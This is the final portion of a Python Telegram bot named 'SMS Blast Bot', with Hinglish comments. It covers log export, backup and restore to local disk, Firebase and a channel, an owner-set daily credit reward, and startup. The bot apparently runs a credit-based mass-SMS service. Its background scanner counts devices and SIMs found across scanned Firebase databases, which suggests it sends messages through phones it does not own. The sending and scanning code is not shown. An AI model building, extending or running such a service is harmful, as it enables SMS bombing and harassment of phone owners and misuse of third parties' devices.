        log_lines.append(f"  #{i}: {vid[:50]}...")
    log_lines.append("")

    # 12. Activity Log
    activity = d.get("activity_log", [])
    log_lines.append(f"[ACTIVITY LOG] Total: {len(activity)} (Last 50)")
    for entry in activity[-50:]:
        ts = fmt_time(entry.get("timestamp", 0))
        log_lines.append(f"  [{ts}] UID:{entry.get('uid', 0)} | Action:{entry.get('action', 'unknown')} | {entry.get('details', '')}")
    log_lines.append("")

    # 13. SMS History (last 20 per user)
    sms_hist = d.get("sms_history", {})
    log_lines.append(f"[SMS HISTORY] Users with history: {len(sms_hist)}")
    for uid_str, hist_list in list(sms_hist.items())[:20]:
        log_lines.append(f"  User {uid_str}: {len(hist_list)} entries")
        for entry in hist_list[-3:]:
            ts = fmt_time(entry.get("timestamp", 0))
            log_lines.append(f"    [{ts}] {entry.get('status', '?')} | {entry.get('number', 'N/A')} | {entry.get('message', '')[:30]}...")
    log_lines.append("")

    # 14. Device Health Log
    log_lines.append(f"[DEVICE HEALTH LOG] Total: {len(DEVICE_HEALTH_LOG)} (Last 20)")
    for entry in DEVICE_HEALTH_LOG[-20:]:
        ts = fmt_time(entry.get("timestamp", 0))
        log_lines.append(f"  [{ts}] Devices: {entry.get('devices_found', 0)} | DBs: {entry.get('dbs_scanned', 0)} | Duration: {entry.get('duration_sec', 0)}s | Status: {entry.get('status', 'unknown')}")
    log_lines.append("")

    # 15. Cached Devices
    log_lines.append(f"[CACHED DEVICES] Total: {len(CACHED_DEVICES)} (Current)")
    for dev in CACHED_DEVICES[:10]:
        log_lines.append(f"  - {dev.get('dev_name', 'Unknown')} | FB: {dev.get('fb_label', 'N/A')} | SIMs: {len(dev.get('sims', []))}")
    if len(CACHED_DEVICES) > 10:
        log_lines.append(f"  ... and {len(CACHED_DEVICES) - 10} more devices")
    log_lines.append("")

    log_lines.append("=" * 60)
    log_lines.append("  END OF LOG EXPORT")
    log_lines.append("=" * 60)

    log_text = "\n".join(log_lines)

    # Send as document
    from aiogram.types import BufferedInputFile
    file_bytes = io.BytesIO(log_text.encode("utf-8"))
    file_bytes.name = f"blast_bot_logs_{now_ist().strftime('%Y%m%d_%H%M%S')}.txt"

    await msg.answer_document(
        document=BufferedInputFile(file_bytes.getvalue(), filename=file_bytes.name),
        caption=f"{em(EMOJI_GEAR, '📜')} <b>Full Database Log Export</b>\n{em(EMOJI_STAR, '📊')} Version: {_VERSION}\n{em(EMOJI_GEAR, '📅')} Generated: {now_ist().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode="HTML"
    )


_PERSIST_CANDIDATES = ["/var/data", "/data", "/mnt/data", "/var/lib/blastbot"]


def _find_persist_dir() -> "str | None":
    """Persistent storage auto-detect — Render Persistent Disk ka default mount /var/data hai.
    Agar aisi dir mounted + writable hai toh data/backup wahan rakhenge (redeploy pe safe)."""
    for p in _PERSIST_CANDIDATES:
        try:
            if os.path.isdir(p) and os.access(p, os.W_OK):
                return p
        except Exception:
            pass
    return None


def _ensure_persistent_storage() -> "str | None":
    """Agar persistent dir mile toh main DB + purane backups wahan shift/sync karo,
    aur aage saara data (har save + backup) persistent path par hi chalta hai.
    Ek baar setup hone ke baad har restart/redeploy pe data safe."""
    global _DATA_FILE, _BACKUP_DIR
    pd = _find_persist_dir()
    if not pd:
        return None
    try:
        persist_db = os.path.join(pd, "blast_data.json")
        cur_has = os.path.exists(_DATA_FILE) and _db_has_data(_DATA_FILE)
        per_has = os.path.exists(persist_db) and _db_has_data(persist_db)
        if per_has and not cur_has:
            # persist mein data hai, current missing/empty (wipe hua tha) → persist se uthao
            shutil.copy2(persist_db, _DATA_FILE)
            log.info(f"[PERSIST] DB {pd} se current location par restore hua")
        elif cur_has and not per_has:
            shutil.copy2(_DATA_FILE, persist_db)
            log.info(f"[PERSIST] DB {pd} par migrate hua")
        elif cur_has and per_has:
            # dono real — CWD wala latest hai (persist mirror refresh karo)
            shutil.copy2(_DATA_FILE, persist_db)
        # purane local backups bhi persist dir mein le aao
        for old_bk in glob.glob("blast_data_backup_*.json"):
            dst = os.path.join(pd, os.path.basename(old_bk))
            if not os.path.exists(dst):
                shutil.copy2(old_bk, dst)
        # ab main DB + backups persistent path par hi
        if os.path.exists(_DATA_FILE):
            shutil.copy2(_DATA_FILE, persist_db)
        _DATA_FILE = persist_db
        _BACKUP_DIR = pd
        log.info(f"[PERSIST] Persistent storage active: {pd} — ab restart/redeploy par data safe")
        return pd
    except Exception as e:
        log.warning(f"[PERSIST] setup failed: {e}")
        return None


def _db_has_data(path: str) -> bool:
    """DB file mein real data hai? (users ya firebases) — sirf empty default file nahi"""
    try:
        with open(path, "r", encoding="utf-8") as f:
            d = json.load(f)
        return len(d.get("users", {}) or {}) > 0 or len(d.get("firebases", []) or []) > 0
    except Exception:
        return False


def _find_latest_backup() -> "str | None":
    """Latest local backup dhundo — CWD aur script folder DONO jagah
    (Render pe jab CWD script se alag ho tab bhi mil jaaye)"""
    candidates = set()
    for dd in {_BACKUP_DIR, ".", os.path.dirname(os.path.abspath(__file__))}:
        try:
            candidates.update(glob.glob(os.path.join(dd, "blast_data_backup_*.json")))
        except Exception:
            pass
    candidates = sorted({os.path.abspath(p) for p in candidates})
    return candidates[-1] if candidates else None


async def auto_restore_db_if_needed(bot=None) -> str:
    """System/bot restart par recent backup se DIRECT auto-import.
    Rules:
      1) Main DB missing ya corrupt                → latest backup se direct import
      2) Main DB valid lekin EMPTY (koi users/firebases nahi) → latest backup se direct import
      3) Main DB valid + data hai                  → main DB hi recent se recent hai
         (backup 1 ghanta purana ho sakta hai, usse cover na karein) → main rakho
    Return: "ok" | "restored:<file>" | "no_backup" | "restore_failed" """
    latest = _find_latest_backup()
    log.info(f"[RESTORE] startup check — latest backup: {latest or 'NAHI mila'}")

    main_valid = False
    if os.path.exists(_DATA_FILE):
        try:
            with open(_DATA_FILE, "r", encoding="utf-8") as f:
                json.load(f)
            main_valid = True
        except Exception as e:
            log.error(f"[RESTORE] main DB corrupt: {e}")
    else:
        log.error("[RESTORE] main DB file missing")

    if main_valid and _db_has_data(_DATA_FILE):
        log.info("[RESTORE] main DB valid + data present — yahi latest data hai, import skip")
        return "ok"

    # Import zaroori hai (DB missing/corrupt/empty) — pehle local, phir FIREBASE se direct import
    if not latest:
        try:
            ok_f, info_f = await fb_cloud_restore()
            if ok_f:
                log.info(f"[RESTORE] FIREBASE SE DIRECT IMPORT HO GAYA: {info_f}")
                return f"restored:{info_f}"
            if info_f != "not_configured":
                log.warning(f"[RESTORE] firebase restore fail: {info_f}")
        except Exception as e:
            log.error(f"[RESTORE] firebase restore error: {e}")
        # Channel backup (saved file_id manifest se)
        if bot is not None:
            try:
                ok_c, info_c = await _restore_from_channel(bot)
                if ok_c:
                    log.info(f"[RESTORE] CHANNEL SE DIRECT IMPORT HO GAYA: {info_c}")
                    return f"restored:{info_c}"
                if info_c != "no_channel_ref":
                    log.warning(f"[RESTORE] channel restore fail: {info_c}")
            except Exception as e:
                log.error(f"[RESTORE] channel restore error: {e}")
        if main_valid:
            log.info("[RESTORE] main DB empty hai lekin koi backup (local/firebase) nahi — fresh start")
        else:
            log.warning("[RESTORE] main DB missing/corrupt + koi backup nahi — fresh start")
        return "no_backup"

    try:
        with open(latest, "r", encoding="utf-8") as f:
            json.load(f)  # backup pehle validate karo
        shutil.copy2(latest, _DATA_FILE)
        log.info(f"[RESTORE] RECENT BACKUP SE DIRECT IMPORT HO GAYA: {latest}")
        return f"restored:{os.path.basename(latest)}"
    except Exception as e:
        log.error(f"[RESTORE] restore failed: {e}")
        return "restore_failed"




# ── 🎁 DAILY REWARD (auto) — admin on/off + amount set karta hai ──────────
# Har private user ka 24h ke beech PEHLA message → automatic +amount credits
# + "Your credit increased" notification. New user ko /start hote hi milta hai.
DAILY_REWARD_HOURS = 24
# In-memory cache — har message pe DB file parse MAT karo (CPU safe).
# File load/save sirf tab hota hai jab reward ACTUALLY grant ho (24h mein 1 baar/user).
_DAILY_REWARD_CACHE = {"enabled": False, "amount": 0, "last_give": {}}

def _dr_cache_refresh(d: dict = None):
    """Cache ko DB se sync karo (startup / toggle / amount set / grant ke baad)."""
    global _DAILY_REWARD_CACHE
    if d is None:
        try:
            d = load()
        except Exception:
            d = {}
    dr = d.get("daily_reward") or {}
    try:
        _DAILY_REWARD_CACHE = {
            "enabled": bool(dr.get("enabled")),
            "amount": int(dr.get("amount") or 0),
            "last_give": {str(k): int(v) for k, v in (dr.get("last_give") or {}).items()},
        }
    except Exception:
        _DAILY_REWARD_CACHE = {"enabled": False, "amount": 0, "last_give": {}}


async def _daily_reward_check(msg: Message):
    """Ek message aane par: daily reward due? FAST PATH = in-memory (koi file IO nahi)."""
    if not _DAILY_REWARD_CACHE["enabled"] or _DAILY_REWARD_CACHE["amount"] <= 0:
        return
    uid = msg.from_user.id
    now = int(time.time())
    if now - int(_DAILY_REWARD_CACHE["last_give"].get(str(uid), 0)) < DAILY_REWARD_HOURS * 3600:
        return
    # Due hai — abhi file par confirm + grant (sirf yahan load/save)
    try:
        d = load()
        dr = d.get("daily_reward") or {"enabled": False, "amount": 10, "last_give": {}}
        if not dr.get("enabled"):
            _dr_cache_refresh(d)
            return
        amount = int(dr.get("amount") or 0)
        if amount <= 0:
            _dr_cache_refresh(d)
            return
        if is_banned(uid, d):
            return
        if now - int((dr.get("last_give") or {}).get(str(uid), 0)) < DAILY_REWARD_HOURS * 3600:
            _dr_cache_refresh(d)  # concurrent grant already ho chuka
            return
        u = d["users"].get(str(uid))
        if u is None:
            reg_user(uid, msg.from_user.full_name or "User", d)
            u = d["users"][str(uid)]
        u["credits"] = int(u.get("credits") or 0) + amount
        dr.setdefault("last_give", {})[str(uid)] = now
        d["daily_reward"] = dr
        try:
            log_activity(d, "daily_reward", uid, f"+{amount} credits (auto)")
        except Exception:
            pass
        save(d)
        _dr_cache_refresh(d)
        await msg.answer(
            f"🎁 <b>Daily Reward</b>\n\n"
            f"💰 <b>Your credit increased!</b> <b>+{amount}</b>\n"
            f"🏦 <b>New Balance:</b> {u['credits']} credits\n\n"
            f"⏰ <i>Agla reward 24 ghante baad — aapka pehla message hi kaafi hai.</i>",
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"[DAILY-REWARD] grant error: {e}")


class DailyRewardMiddleware(BaseMiddleware):
    """Saare private messages se pehle chalta hai (handler ko block nahi karta)."""
    async def __call__(self, handler, event: Message, data: dict):
        try:
            if (event.chat and event.chat.type == "private"
                    and event.from_user and not event.from_user.is_bot):
                await _daily_reward_check(event)
        except Exception as e:
            log.error(f"[DAILY-REWARD] middleware error: {e}")
        return await handler(event, data)


# ── 🎁 DAILY REWARD OWNER HANDLERS ─────────────────────────────────────────
def _dr_panel_text(d: dict) -> str:
    dr = d.get("daily_reward") or {}
    status = "🟢 <b>ON</b>" if dr.get("enabled") else "🔴 <b>OFF</b>"
    amount = dr.get("amount", 0)
    return (
        f"🎁 <b>Daily Reward (Auto)</b>\n\n"
        f"Status: {status}\n"
        f"💰 Amount: <b>{amount}</b> credits / 24h\n\n"
        "Har user ka 24h ke beech <b>pehla message</b> aane par bot automatic\n"
        "credits de deta hai + <i>\"Your credit increased\"</i> msg bhejta hai.\n"
        "<b>New users</b> ko /start hote hi pehla reward mil jata hai."
    )


@R.callback_query(F.data == "owner:daily_reward")
async def owner_daily_reward(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await safe_answer(cq)
    await state.clear()
    dr = d.get("daily_reward") or {}
    toggle_txt = "🔘 Turn OFF" if dr.get("enabled") else "🔘 Turn ON"
    await cq.message.edit_text(
        _dr_panel_text(d),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=toggle_txt, callback_data="dr:toggle")],
            [InlineKeyboardButton(text="💰 Set Amount", callback_data="dr:set")],
            [InlineKeyboardButton(text="⬅️ Owner Panel", callback_data="owner:home")]
        ]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "dr:toggle")
async def dr_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    await safe_answer(cq)
    await state.clear()
    dr = d.get("daily_reward") or {"enabled": False, "amount": 10, "last_give": {}}
    dr["enabled"] = not dr.get("enabled")
    d["daily_reward"] = dr
    save(d)
    _dr_cache_refresh(d)
    log_activity(d, "daily_reward_toggle", cq.from_user.id, "ON" if dr["enabled"] else "OFF")
    toggle_txt = "🔘 Turn OFF" if dr["enabled"] else "🔘 Turn ON"
    await cq.message.edit_text(
        _dr_panel_text(d) + f"\n\n✅ <b>{'Enable' if dr['enabled'] else 'Disable'} kar diya!</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=toggle_txt, callback_data="dr:toggle")],
            [InlineKeyboardButton(text="💰 Set Amount", callback_data="dr:set")],
            [InlineKeyboardButton(text="⬅️ Owner Panel", callback_data="owner:home")]
        ]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "dr:set")
async def dr_set_amount(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫")
        return
    await safe_answer(cq)
    await state.set_state(S.daily_reward_amount)
    await cq.message.edit_text(
        "💰 <b>Set Daily Reward Amount</b>\n\n"
        "24h ke liye kitne credits do? <b>Number</b> bhejo (1 se 100000).",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )


@R.message(S.daily_reward_amount, F.text)
async def dr_set_amount_received(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        await msg.answer("🚫 Owner Only!")
        return
    txt = (msg.text or "").strip()
    try:
        amount = int(txt)
    except Exception:
        await msg.answer("❌ Number bhejo (1 se 100000). Dobara try karo:")
        return
    if amount < 1 or amount > 100000:
        await msg.answer("❌ 1 se 100000 ke beech mein amount rakho. Dobara try karo:")
        return
    dr = d.get("daily_reward") or {"enabled": False, "amount": 10, "last_give": {}}
    dr["amount"] = amount
    d["daily_reward"] = dr
    save(d)
    _dr_cache_refresh(d)
    log_activity(d, "daily_reward_amount", msg.from_user.id, str(amount))
    await state.clear()
    toggle_txt = "🔘 Turn OFF" if dr.get("enabled") else "🔘 Turn ON"
    await msg.answer(
        _dr_panel_text(d) + f"\n\n✅ <b>Amount update ho gaya: {amount} credits/24h</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=toggle_txt, callback_data="dr:toggle")],
            [InlineKeyboardButton(text="💰 Set Amount", callback_data="dr:set")],
            [InlineKeyboardButton(text="⬅️ Owner Panel", callback_data="owner:home")]
        ]),
        parse_mode="HTML"
    )


def _hydrate_scan_state() -> bool:
    """DB mein saved scan state (24h ke andar) se CACHED_DEVICES/FB_DEVICE_COUNTS bharo.
    Return True agar hydration hui (scanner ab 24h window tak scan skip karega)."""
    global CACHED_DEVICES, LAST_SCAN_TIME, SCAN_STATUS
    try:
        _ls = load().get("last_scan") or {}
        if _ls.get("ts") and (time.time() - int(_ls["ts"])) < _BACKGROUND_SCAN_INTERVAL:
            CACHED_DEVICES = _ls.get("devices", []) or []
            LAST_SCAN_TIME = float(_ls["ts"])
            for _fk, _fv in (_ls.get("fb_counts") or {}).items():
                FB_DEVICE_COUNTS[_fk] = _fv
            SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(CACHED_DEVICES)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ᴀsᴛ: {fmt_time(int(LAST_SCAN_TIME))}"
            log.info(f"[START] Scan state DB se hydrated — 24h ke andar scan skip ({len(CACHED_DEVICES)} cached devices)")
            return True
    except Exception as e:
        log.warning(f"[START] Scan state hydrate fail: {e}")
    return False


async def main():
    # Pehle persistent storage detect (Render disk /var/data) — restore se pehle
    persist_dir = _ensure_persistent_storage()
    bot = Bot(token=BOT_TOKEN)
    # Startup: agar DB corrupt/missing ho toh auto-restore (local → firebase → channel)
    # ⚠️ restore ke dauran save() hook ko Firebase push se rok do (fresh-DB-overwrite race)
    _RESTORE_IN_PROGRESS[0] = True
    try:
        restore_status = await auto_restore_db_if_needed(bot)
    finally:
        _RESTORE_IN_PROGRESS[0] = False
    if restore_status.startswith("restored:"):
        log.info(f"[START] Auto-restore ho gaya: {restore_status}")
        # Restore ho chuka — Firebase ko CURRENT (restored) data se re-sync karo,
        # taaki latest node hamesha current state rakhe
        try:
            _LAST_FB_BACKUP_TS[0] = time.time()
            asyncio.get_running_loop().create_task(fb_cloud_backup(load()))
        except Exception as e:
            log.warning(f"[START] Post-restore Firebase re-push skip: {e}")
    elif restore_status == "no_backup":
        log.info("[START] Koi backup nahi mila — fresh start")

    # Startup par ek fresh local backup bhi bana lo — taaki pehla hourly tick se
    # pehle VPS band ho jaye toh bhi restore point exist kare
    _startup_backup = make_local_backup()
    if _startup_backup:
        log.info(f"[START] Startup local backup: {_startup_backup}")

    # Daily reward cache DB se hydrate (middleware ab in-memory check karta hai — CPU save)
    try:
        _dr_cache_refresh()
    except Exception:
        pass
    # Scan state hydrate — 24h ke andar hui scan ka result DB se lo, taaki
    # restart/redeploy pe poora scan DOBARA na chale (VPS CPU/IO save)
    _hydrate_scan_state()

    dp = Dispatcher(storage=MemoryStorage())
    dp.message.middleware(DailyRewardMiddleware())
    dp.include_router(R)

    @dp.errors()
    async def _global_error_handler(event: ErrorEvent):
        exc = event.exception
        msg = str(exc)
        if isinstance(exc, TelegramBadRequest) and (
            "query is too old" in msg.lower() or "query id is invalid" in msg.lower()
        ):
            log.info(f"[SAFE] Stale callback query ignore kiya: {msg[:120]}")
            return
        log.error(f"Handler error: {type(exc).__name__}: {msg[:300]}", exc_info=exc)

    me = await bot.get_me()
    log.info(f"@{me.username} — SMS Blast Bot {_VERSION} started!")

    scanner_task = asyncio.create_task(background_firebase_scanner(bot))
    backup_task = asyncio.create_task(background_backup_sender(bot))
    log.info("Background scanner & backup tasks created")

    if restore_status == "ok":
        restore_line = "✅ OK (main DB latest — import ki zaroorat nahi thi)"
    elif restore_status.startswith("restored:"):
        restore_line = f"♻️ AUTO-IMPORT HO GAYA (recent backup: {restore_status.split(':',1)[1]})"
    elif restore_status == "no_backup":
        restore_line = "🆕 Fresh start (koi recent backup nahi mila) — channel ka latest backup import karo"
    else:
        restore_line = "⚠️ Import failed — fresh start"

    if persist_dir:
        persist_line = f"✅ PERSISTENT ({persist_dir}) — restart/redeploy pe data safe"
    else:
        persist_line = "⚠️ TEMPORARY — Render pe Persistent Disk attach karo (/var/data), data hamesha safe rahega"

    try:
        _fbu = get_backup_fb_url()
    except Exception:
        _fbu = ""
    fb_line = f"✅ <code>{_fbu.split('//', 1)[-1]}</code>" if _fbu else "❌ not set (owner panel → backup firebase)"
    try:
        _dr = load().get("daily_reward") or {}
        dr_line = f"✅ ON (<b>{_dr.get('amount', 0)}</b> credits/24h)" if _dr.get("enabled") else "❌ OFF (owner panel → daily reward)"
    except Exception:
        dr_line = "❌ OFF"

    try:
        await bot.send_message(
            MAIN_OWNER,
            f"{em(EMOJI_ROCKET, '🚀')} <b>SMS Blast Bot {_VERSION} Online!</b>\n@{me.username}\n"
            f"<code>{now_ist().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
            f"{em(EMOJI_GEAR, '🔄')} <b>Background Scanner:</b> Starting...\n"
            f"📦 <b>Auto Database Backup:</b> Every 1 Hour -> Log Channel\n"
            f"🗄 <b>DB Status:</b> {restore_line}\n"
            f"💾 <b>Storage:</b> {persist_line}\n"
            f"📦 <b>FB Cloud Backup:</b> {fb_line}\n"
            f"🎁 <b>Daily Reward:</b> {dr_line}\n"
            f"{em(EMOJI_WARNING, '⏱')} Auto-Scan Interval: <b>24 hours (1 din mein 1 baar)</b>\n"
            f"{em(EMOJI_STAR, '👥')} <b>Per-User Sessions:</b> ENABLED\n"
            f"{em(EMOJI_ROCKET, '🚀')} <b>Concurrent Users:</b> 1000+\n"
            f"{em(EMOJI_LOCK, '🔒')} <b>Number Protection:</b> ENABLED\n"
            f"{em(EMOJI_VIDEO, '📹')} <b>Video Section & Auto-Send:</b> ENABLED\n"
            f"{em(EMOJI_MONEY, '💸')} <b>Credit Transfer:</b> ENABLED\n"
            f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits All:</b> ENABLED (With Yes/No & Protection)\n"
            f"👤 <b>Bot Owner:</b> {SUPER_ADMIN_NAME}",
            parse_mode="HTML"
        )
    except Exception as e:
        log.warning(f"Owner notify: {e}")

    log.info("Polling start ho raha hai... (NOTE: isi token se sirf EK instance chale, warna 409 conflict)")
    try:
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    except TelegramConflictError:
        # Do instances ek hi token se chal rahe hain
        log.error("409 CONFLICT: isi token se pehle se ek aur bot instance chal raha hai!")
        try:
            await bot.send_message(
                MAIN_OWNER,
                ("⚠️ <b>409 Conflict — Bot do baar start hua hai!</b>\n\n"
                 "Isi token se ek aur process pehle se chal raha hai.\n"
                 "Purana process band karo (e.g. <code>kill</code> ya VPS pe puma/systemd service stop),\n"
                 "phir sirf <b>EK</b> instance start karo."),
                parse_mode="HTML"
            )
        except Exception as e:
            log.warning(f"Conflict owner notify failed: {e}")
        await bot.session.close()
        os._exit(1)
    except Exception as e:
        log.error(f"Polling error: {e}")
        try:
            await bot.send_message(
                MAIN_OWNER,
                f"❌ <b>Polling error:</b> {str(e)[:300]}",
                parse_mode="HTML"
            )
        except Exception:
            pass
        await bot.session.close()
        raise

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("Bot stopped by user")
    except Exception as e:
        log.error(f"Bot crashed: {type(e).__name__}: {e}")
        raise
